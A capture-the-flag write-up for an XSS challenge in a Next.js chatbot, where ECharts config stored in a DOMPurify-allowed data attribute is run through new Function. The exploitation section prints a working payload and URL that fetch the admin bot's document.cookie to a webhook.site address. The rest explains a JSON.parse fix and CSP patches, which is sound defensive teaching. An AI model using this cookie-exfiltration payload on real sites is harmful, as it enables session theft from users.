# pretty-chatbot - Writeup

## 1. Where the vulnerability exists and why it happens
This one looks much safer than the **babyxss** and **toddlerxss** because it actually sanitizes with DOMPurify, but there's a hole in the ECharts code path.

The flow is: the admin bot visits a URL I give it. On load, `contexts/ChatContext.tsx` reads a `message` parameter from the URL, decodes it, and auto-sends it as a chat message:
```js
const initialMessage = urlParams.get('message');
const decodedMessage = decodeURIComponent(initialMessage);
sendInitialMessage(decodedMessage);
```
That message gets rendered in `components/Message.tsx` with `dangerouslySetInnerHTML`. Before rendering, `processContent()` runs `markdown-it` and then **DOMPurify** with a tag/attribute allow-list. DOMPurify has **no `<script>`** and no event-handler attributes, so the usual `<script>` / `<img onerror>` payloads get stripped. So DOMPurify is *not* the bug.

The real bug is the ECharts feature. A "```` ```echarts ````" code block is turned into a `<div>` whose chart config is stashed in a `data-echarts-config` attribute:
```js
return `<div class="echarts-container" id="${chartId}" data-echarts-config="${encodedConfig}" ...></div>`;
```
`div`, `class`, `id`, and `data-echarts-config` are **all on DOMPurify's allow-list** (`ALLOW_DATA_ATTR: true`), so this div sails through sanitization untouched. Then `hooks/useECharts.ts` reads the config back out and parses it like this:
```js
const parseOption = (optStr) => new Function(`return ${optStr.trim()}`)();
```
**`new Function(...)()` is basically `eval`.** The chart "config" is executed as JavaScript. DOMPurify never had a chance because it only saw a harmless-looking `data-` attribute - the string isn't treated as code until `useECharts` runs it later. That's the sink. The flag lives in the admin bot's cookie, so the payload just reads `document.cookie`.

## How I exploited it and got the flag
1. I used the same webhook.site request-logging page from the earlier challenges.
2. I put an ECharts code block in the `message` URL parameter. The "config" is really a `fetch()` that reads the cookie and sends it to my webhook:

       ```echarts
       fetch("https://webhook.site/<id>/?c="+encodeURIComponent(document.cookie))
       ```
   As a URL (the whole block is URL-encoded into `?message=`):

       http://pretty-chatbot.136-83-2-1.sslip.io/?message=%60%60%60echarts%0Afetch(%22https%3A%2F%2Fwebhook.site%2F<id>%2F%3Fc%3D%22%2BencodeURIComponent(document.cookie))%0A%60%60%60
3. I loaded that URL in my own browser first to confirm it ran - the chart renders as an empty bordered box (ECharts has nothing real to draw), which is the tell that my `fetch` executed instead of a real config.
4. Because the "Share to Admin" button submits `window.location.href`, I had to be **on that payload URL** when I clicked it (not just type the block into the chat box). I loaded the `?message=` link, then clicked **Share to Admin**.
5. The bot visited the link, my ECharts "config" executed in its session, and the flag arrived at my webhook in the `?c=` parameter (the bot has no adblocker, so its `fetch` went through fine).

## How the code patch works (`vuln.patch`)
The root cause is that the config is run as *code*. The fix is to treat it as *data*: I replaced the `new Function(...)` eval in `hooks/useECharts.ts` with `JSON.parse()`. `JSON.parse` can only build plain objects/arrays - it cannot execute `fetch(...)` or anything else - so the injected payload just fails to parse and the chart errors out harmlessly. Real ECharts options are plain JSON objects, so legitimate charts still render. (DOMPurify already blocks the script/attribute vectors, so closing the eval sink is all that's needed.)

## How the CSP 2.0 patch works (`csp2.patch`)
This app is Next.js, so instead of an Express header, I added the CSP in `next.config.js` via the `headers()` function. The header is:

    script-src 'self' (no 'unsafe-inline', no 'unsafe-eval')

The important directive here is the **absence of `'unsafe-eval'`**: `new Function()` is governed by `script-src`, and without `'unsafe-eval'` it throws, so the ECharts "config" can never execute - the exploit is dead even against the unpatched code. Dropping `'unsafe-inline'` also means no inline `<script>` or `javascript:` URL can run, and `connect-src 'self'` blocks the exfil `fetch` to my webhook as a backup layer.

## How the CSP 3.0 patch works (`csp3.patch`) - bonus
CSP 3.0 isn't required for this challenge, but I included it for the bonus. A per-request nonce can't be set from the static `next.config.js` header, so I added a `middleware.ts` that runs on every request. It generates a fresh random nonce, puts it in the `Content-Security-Policy` header as `script-src 'nonce-<value>' 'strict-dynamic'`, and sets it on both the request and the response. Next.js automatically stamps that same nonce onto its own framework `<script>` tags (it reads the nonce from the CSP header on the request), so the app keeps working. The attacker's injected ECharts payload carries no nonce, and there is still no `'unsafe-eval'`, so the `new Function(...)` call is blocked twice over. `'strict-dynamic'` is the modern setting that pairs with nonces and lets a trusted script load further scripts if needed.
